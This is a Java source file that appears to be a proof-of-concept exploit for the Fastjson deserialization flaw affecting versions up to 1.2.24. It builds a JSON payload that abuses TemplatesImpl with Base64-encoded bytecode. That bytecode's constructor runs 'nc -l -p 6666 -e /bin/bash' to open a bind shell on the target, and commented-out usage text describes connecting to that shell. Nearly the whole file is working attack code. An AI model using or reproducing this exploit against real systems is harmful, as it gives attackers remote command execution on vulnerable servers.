package com.secfree.www;

import java.io.IOException;
import java.util.Base64;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/**
 * 
 * Fastjson反序列化 Poc
 * 
 * @author Bearcat
 *
 */
public class Payload extends AbstractTranslet {

    public Payload(){
        try {
            Runtime.getRuntime().exec("nc -l -p 6666 -e /bin/bash");//command
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}

    @Override
    public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}

    public static String readClass(String classname) throws IOException, NotFoundException, CannotCompileException {
        ClassPool cp = ClassPool.getDefault();
        CtClass cc = cp.get(classname);
        byte[] b = cc.toBytecode();
        return Base64.getEncoder().encodeToString(b);
    }
    
    public static String payload() throws IOException, NotFoundException, CannotCompileException{
    	 return "{" +
                "\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_bytecodes\":[\"" + readClass("com.secfree.www.Payload") + "\"]," +
                "\"_name\":\"shit\"," +
                "\"_tfactory\":{}," +
                "\"_outputProperties\":{}" +
             "}";
	}
    
    public static void main(String[] args) throws IOException, NotFoundException, CannotCompileException {
    	
    	System.out.println(payload());
    	
//    	if(args.length <= 0){
//    		System.out.println("*********************************************************************");
//    		System.out.println("*                                                                   *");
//    		System.out.println("*                  Fastjson 反序列化反弹 Shell 脚本                 *");
//        	System.out.println("*                                                                   *");
//        	System.out.println("*                          www.secfree.com                          *");
//        	System.out.println("*                                                                   *");
//        	System.out.println("*********************************************************************\n");
//        	System.out.println("[*] Usage: java -jar Fastjson-Payload.jar --use 20170315 ");
//        	System.out.println("\t 20170315 => {[Fastjson <= 1.2.24] [https://github.com/alibaba/fastjson/wiki/security_update_20170315]}\n");
//        }else if("20170315".equals(args[1])){
//        	System.out.println("\n[*] Usage: [Fastjson Version <= 1.2.24]\n");
//        	System.out.println("[+] command: nc -l -p 6666 -e /bin/bash\n");
//    		System.out.println("[*] Generate Payload:\n\n\n" + payload() + "\n\n");
//    		System.out.print("[+] Shell: nc attack 6666\n");
//    	}
    	 /*
         *  命令执行测试
         */
//        JSON.parseObject(payload(), Object.class, Feature.SupportNonPublicField);
	}
}